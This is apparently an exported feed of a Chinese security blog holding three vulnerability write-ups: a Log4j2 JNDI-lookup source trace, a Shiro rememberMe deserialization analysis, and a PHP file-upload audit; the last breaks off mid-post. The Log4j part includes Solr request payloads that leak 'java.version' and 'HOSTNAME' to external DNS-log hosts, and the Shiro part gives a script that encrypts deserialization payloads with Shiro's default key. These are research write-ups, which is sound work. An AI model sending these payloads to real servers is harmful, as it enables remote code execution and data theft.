    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码</p><p>‍</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415999.png" alt="image">​</p><p>由于Apache Log4j2某些功能存在递归解析，攻击者可在未经身份验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码</p><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.14.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> java.util.function.LongFunction;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger(LongFunction.class);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;java:os&#125;&quot;</span>;<br>        logger.error(<span class="hljs-string">&quot;error info:&#123;&#125;&quot;</span>,message);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415469.png" alt="image">​</p><p>在执行上述代码的时候可以发现他对我们的<code>$&#123;java.os&#125;</code>​进行了解析,那么对此我们进行分析为什么会对<code>$&#123;</code>​进行解析？</p><p>于是前面的直接跳过，直接在这个包下下断点，因为这个类是拿来对日志信息进行打印的</p><p><code>log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\layout\PatternLayout#toSerializable()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415622.png" alt="image">​</p><p>两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffe</p><p>这里其实没有必要跟进这个<code>format</code>​方法(有别的师傅踩坑了) 直接让<code>i = 8</code>​ 来看是什么</p><p>发现是走到了<code>log4j-core-2.14.1.jar!\org\apache\logging\log4j\core\pattern\MessagePatternConverter#format()</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415780.png" alt="image">​</p><p>当我们进到这个<code>format()</code>​方法里面之后，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走然后继续往下走，会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在<code>$&#123;</code>​，那么就会取出从 $ 开始知道最后的字符串，这一步</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415949.png" alt="image">​</p><p>但是这里有个<code>replace</code>​方法会不会进行一个替换呢？ 跟进</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415135.png" alt="image">​</p><p>接着调用了<code>substitute</code>​方法</p><p>这里就是获取payload了，这里存在一个while 循环 会对字符进行逐字匹配<code>$&#123;</code>​然后进行循环读取，知道读取到<code>&#125;</code>​ 并获取其坐标，然后将 <code>$&#123;&#125;</code>​ 中间的内容取出来</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415261.png" alt="image">​</p><p>将 <code>varName</code>​ 作为变量传入了 <code>resolveVariable</code>​ 函数</p><p>这里我们看到<code>resolveVariable()</code>​方法里面是调用了<code>lookup()</code>​方法，这个<code>lookup()</code>​方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的<code>lookup()</code>​方法的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415480.png" alt="image">​</p><p>‍</p><p>总结一下</p><ol><li>先判断内容中是否有<code>$&#123;&#125;</code>​，然后截取<code>$&#123;&#125;</code>​中的内容，得到我们的恶意payload<code>jndi:xxx</code>​</li><li>后使用<code>:</code>​分割payload，通过前缀来判断使用何种解析器去调用对应协议的<code>lookup</code>​方法 ，写了<code>JNDI</code>​就会去用<code>JNDI</code>​去调ldap</li><li>支持的前缀包括<code>date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j</code>​</li></ol><p>最后就造成了JNDI注入</p><p>‍</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415668.png" alt="image">​</p><p>solr的话就是一个接口存在log4j2</p><p>‍</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.yujrzdhxzy.dgrh3.cn&#125; HTTP/1.1<br>Host: 192.168.0.130:8983<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36<br>Connection: close<br><br>GET /solr/admin/cores?action=$&#123;jndi:ldap://$&#123;env.HOSTNAME&#125;.qv2yc5.dnslog.cn&#125; HTTP/1.1<br>Host: 192.168.0.130:8983<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36<br>Accept-Encoding: gzip, deflate<br>Accept: */*<br>Cookie: JSESSIONID=59B4699E94286E436A0472BBD0D54CF8<br>Connection: close<br><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415808.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312151415948.png" alt="image">​</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全 - Shiro反序列化原理分析</title>
    <link href="/post/java-safety-shiro-revitalization-principles-analysis-1wmw4g.html"/>
    <url>/post/java-safety-shiro-revitalization-principles-analysis-1wmw4g.html</url>
    
    <content type="html"><![CDATA[<h1 id="Java安全-Shiro反序列化原理分析"><a href="#Java安全-Shiro反序列化原理分析" class="headerlink" title="Java安全 - Shiro反序列化原理分析"></a>Java安全 - Shiro反序列化原理分析</h1><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro的易于理解的API，您可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序</p><p>‍</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>‍</p><p>我们从攻击的逆推来看看这个<code>shiro</code>​的代码</p><p>通过工具代理到bp当中查看报文</p><p>这是执行了whoami的包</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449739.png" alt="image">​</p><p>基本上跟说的序列化的值在cookie里头一致，这个时候全局去搜索一下rememberMe这个字段</p><p>可以找到CookieRememberMeManager方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449334.png" alt="image">​</p><p>我们需要知道shiro是如何获取cookie的，通过上下文的跟踪看到了getCookie方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449456.png" alt="image">​</p><p>查找调用getCookie发现存在getRememberedSerializedIdentity方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449582.png" alt="image">​</p><p>‍</p><p>跟进getRememberedSerializedIdentity方法 看他对我们传入的cookie做了什么-&gt; 先进行获取base64的cookie值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449725.png" alt="image">​</p><p>然后进行了base64解密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449927.png" alt="image">​</p><p>再往上跟找到<code>getRememberedPrincipals</code>​方法</p><p>将我们base64解密的值传入了<code>bytes</code>​数组中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449053.png" alt="image">​</p><p>那么现在我们知道我们传入的cookie值会被base64解密，解密出来的值会去干嘛呢？</p><p>发现他走了<code>shiro-shiro-root-1.2.4\core\src\main\java\org\apache\shiro\mgt\AbstractRememberMeManager#convertBytesToPrincipals()</code>​这个方法，跟进</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449226.png" alt="image">就是对我们base64解密出来的字节再一次解密，解密后调用<code>deserialize</code>​来进行反序列化</p><p>‍</p><p>那么我们在shiro-web.jar下进行cookie利用的断点调试最后也是走到了这个原生的反序列化里头</p><p>找到<code>src/main/java/org/apache/shiro/io/DefaultSerializer#deserialize()#readobject()</code>​</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassResolvingObjectInputStream</span>(bis);<br>    <span class="hljs-type">T</span> <span class="hljs-variable">deserialized</span> <span class="hljs-operator">=</span> ois.readObject();<br>    ois.close();<br>    <span class="hljs-keyword">return</span> deserialized;<br>&#125; <br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449322.png" alt="image">​</p><p>那么我们再来看这个对字节做了什么解密</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449621.png" alt="image">​</p><p>‍</p><p>他其实是个接口，但是参数名是加密值+密钥 ，那么这个密钥怎么获得的呢，跟进<code>getDecryptionCipherKey()</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449741.png" alt="image">​</p><p>发现是个常量</p><p>去找一下这个常量如何赋值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449850.png" alt="image">​</p><p>发现在这里找到了<code>shiro-shiro-root-1.2.4\core\src\main\java\org\apache\shiro\mgt\AbstractRememberMeManager.java</code>​</p><p>再往上跟看是怎么把这个东西传进来的</p><p>在这里找到<code>shiro-shiro-root-1.2.4\core\src\main\java\org\apache\shiro\mgt\AbstractRememberMeManager#setCipherKey()</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449009.png" alt="image">​</p><p>再往上跟 <code>shiro-shiro-root-1.2.4\core\src\main\java\org\apache\shiro\mgt\AbstractRememberMeManager#AbstractRememberMeManager</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449290.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449463.png" alt="image">​</p><p>发现就是一个硬编码，整个Cookie的处理流程就跟完了，那么其实就是将从Cookie获取到的字节来去反序列化来打依赖，看有什么依赖打什么链(有CC就打CC 有CB就打CB)</p><p>‍</p><p>生成shiro的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> Random<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64decode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s: s[:s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    <span class="hljs-built_in">print</span>(aes_enc(data).decode())<br></code></pre></td></tr></table></figure><p>打过去就OK了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449586.png" alt="image">​</p><p>‍</p><p>总结一下就是  传入cookie-&gt;base64解密-&gt;(知道AES的key下可以恶意构造序列化的值)-&gt;打反序列化漏洞</p><p>‍</p><p>这里有个要注意的点</p><ul><li>Shiro类是不允许出现数组类，就是里头不能有数组，打CC6的时候<code>tranfromer</code>​有数组调用，所以无法打CC，要打的话就CC2+3+6 就是用<code>In</code>​</li></ul><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141449774.png" alt="image">​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - PHP - 通用系统审计</title>
    <link href="/post/code-audit-a-general-system-audit-z1uj4fj.html"/>
    <url>/post/code-audit-a-general-system-audit-z1uj4fj.html</url>
    
    <content type="html"><![CDATA[<h1 id="代码审计-PHP-通用系统审计"><a href="#代码审计-PHP-通用系统审计" class="headerlink" title="代码审计 - PHP - 通用系统审计"></a>代码审计 - PHP - 通用系统审计</h1><p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13866">https://xz.aliyun.com/t/13866</a></p><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是一套也是各大高校使用的通用系统，已经提交相关SRC平台进行修复</p><h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>直接看登录接口</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431449.png" alt="image">​​</p><p>路由为 &#x2F;setting.php&#x2F;index&#x2F;login</p><p>‍</p><p>找对应源码</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431999.png" alt="image">​​</p><p>第一个接口setting对应Application下的文件</p><p>第二个接口Index对应Setting下的Controller文件名字</p><p>第三个接口为Controller的方法名字</p><p>‍</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>Application\Admin\Controller\UploadController.class.php</p><p>在这个路径下继承了一个upload控制器父类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431500.png" alt="image">​</p><p>所以调用的接口如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431626.png" alt="image">​</p><p>实例化了一个<code>UploadFile()</code>​对象然后给他的属性赋值</p><p>重点关注以下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$upload</span>-&gt;exts = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>); <span class="hljs-comment">// 设置附件上传类型</span><br></code></pre></td></tr></table></figure><p>发现这里会调用<code>UploadFile()</code>​的魔术方法 跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-variable">$name</span>])) &#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-variable">$name</span>]    =   <span class="hljs-variable">$value</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里其实就是问题的本身，要是传进来的在config里头不存在则返回空，那么我们去看一下config的设置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span> =   <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;maxSize&#x27;</span>           =&gt;  -<span class="hljs-number">1</span>,    <span class="hljs-comment">// 上传文件的最大值</span><br>    <span class="hljs-string">&#x27;supportMulti&#x27;</span>      =&gt;  <span class="hljs-literal">true</span>,    <span class="hljs-comment">// 是否支持多文件上传</span><br>    <span class="hljs-string">&#x27;allowExts&#x27;</span>         =&gt;  <span class="hljs-keyword">array</span>(),    <span class="hljs-comment">// 允许上传的文件后缀 留空不作后缀检查</span><br>    <span class="hljs-string">&#x27;allowTypes&#x27;</span>        =&gt;  <span class="hljs-keyword">array</span>(),    <span class="hljs-comment">// 允许上传的文件类型 留空不做检查</span><br>    <span class="hljs-string">&#x27;thumb&#x27;</span>             =&gt;  <span class="hljs-literal">false</span>,    <span class="hljs-comment">// 使用对上传图片进行缩略图处理</span><br>    <span class="hljs-string">&#x27;imageClassPath&#x27;</span>    =&gt;  <span class="hljs-string">&#x27;ORG.Util.Image&#x27;</span>,    <span class="hljs-comment">// 图库类包路径</span><br>    <span class="hljs-string">&#x27;thumbMaxWidth&#x27;</span>     =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 缩略图最大宽度</span><br>    <span class="hljs-string">&#x27;thumbMaxHeight&#x27;</span>    =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 缩略图最大高度</span><br>    <span class="hljs-string">&#x27;thumbPrefix&#x27;</span>       =&gt;  <span class="hljs-string">&#x27;thumb_&#x27;</span>,<span class="hljs-comment">// 缩略图前缀</span><br>    <span class="hljs-string">&#x27;thumbSuffix&#x27;</span>       =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-string">&#x27;thumbPath&#x27;</span>         =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 缩略图保存路径</span><br>    <span class="hljs-string">&#x27;thumbFile&#x27;</span>         =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 缩略图文件名</span><br>    <span class="hljs-string">&#x27;thumbExt&#x27;</span>          =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 缩略图扩展名    </span><br>    <span class="hljs-string">&#x27;thumbRemoveOrigin&#x27;</span> =&gt;  <span class="hljs-literal">false</span>,<span class="hljs-comment">// 是否移除原图</span><br>    <span class="hljs-string">&#x27;thumbType&#x27;</span>         =&gt;  <span class="hljs-number">0</span>, <span class="hljs-comment">// 缩略图生成方式 1 按设置大小截取 0 按原图等比例缩略</span><br>    <span class="hljs-string">&#x27;zipImages&#x27;</span>         =&gt;  <span class="hljs-literal">false</span>,<span class="hljs-comment">// 压缩图片文件上传</span><br>    <span class="hljs-string">&#x27;autoSub&#x27;</span>           =&gt;  <span class="hljs-literal">false</span>,<span class="hljs-comment">// 启用子目录保存文件</span><br>    <span class="hljs-string">&#x27;subType&#x27;</span>           =&gt;  <span class="hljs-string">&#x27;hash&#x27;</span>,<span class="hljs-comment">// 子目录创建方式 可以使用hash date custom</span><br>    <span class="hljs-string">&#x27;subDir&#x27;</span>            =&gt;  <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">// 子目录名称 subType为custom方式后有效</span><br>    <span class="hljs-string">&#x27;dateFormat&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;Ymd&#x27;</span>,<br>    <span class="hljs-string">&#x27;hashLevel&#x27;</span>         =&gt;  <span class="hljs-number">1</span>, <span class="hljs-comment">// hash的目录层次</span><br>    <span class="hljs-string">&#x27;savePath&#x27;</span>          =&gt;  <span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-comment">// 上传文件保存路径</span><br>    <span class="hljs-string">&#x27;autoCheck&#x27;</span>         =&gt;  <span class="hljs-literal">true</span>, <span class="hljs-comment">// 是否自动检查附件</span><br>    <span class="hljs-string">&#x27;uploadReplace&#x27;</span>     =&gt;  <span class="hljs-literal">false</span>,<span class="hljs-comment">// 存在同名是否覆盖</span><br>    <span class="hljs-string">&#x27;saveRule&#x27;</span>          =&gt;  <span class="hljs-string">&#x27;uniqid&#x27;</span>,<span class="hljs-comment">// 上传文件命名规则</span><br>    <span class="hljs-string">&#x27;hashType&#x27;</span>          =&gt;  <span class="hljs-string">&#x27;md5_file&#x27;</span>,<span class="hljs-comment">// 上传文件Hash规则函数名</span><br>    );<br></code></pre></td></tr></table></figure><p>emmm根本没有 <code>exts</code>​ 所以说后缀根本没有检测，可以从从调用的upload中查看</p><p>断到一个叫自动检查附件</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431802.png" alt="image">​</p><p>步进一下进入check函数存在检查文件类型</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431927.png" alt="image">​</p><p>再次跟进一下checkExt发现是一个很强的校验白名单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkExt</span>(<span class="hljs-params"><span class="hljs-variable">$ext</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable language_">$this</span>-&gt;allowExts))<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$ext</span>),<span class="hljs-variable">$this</span>-&gt;allowExts,<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>但是重点是他并没有赋值进去</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431053.png" alt="image">​​</p><p>在这进行反向验证，讲前面的属性修改为在config里头的内容</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431306.png" alt="image">​</p><p>再次进行断点跟到最后面的config的地方发现成功修改</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431428.png" alt="image">​</p><p>所以这套系统只要存在 <code>$upload-&gt;exts =</code>​ 这个的上传接口 就存在任意文件上传</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431633.png" alt="image">​</p><p>‍</p><h2 id="SQL-绕redis缓存"><a href="#SQL-绕redis缓存" class="headerlink" title="SQL(绕redis缓存)"></a>SQL(绕redis缓存)</h2><p>直接看前台控制器了​​</p><p>找到这个路由存在sql的问题</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202312141431839.png" 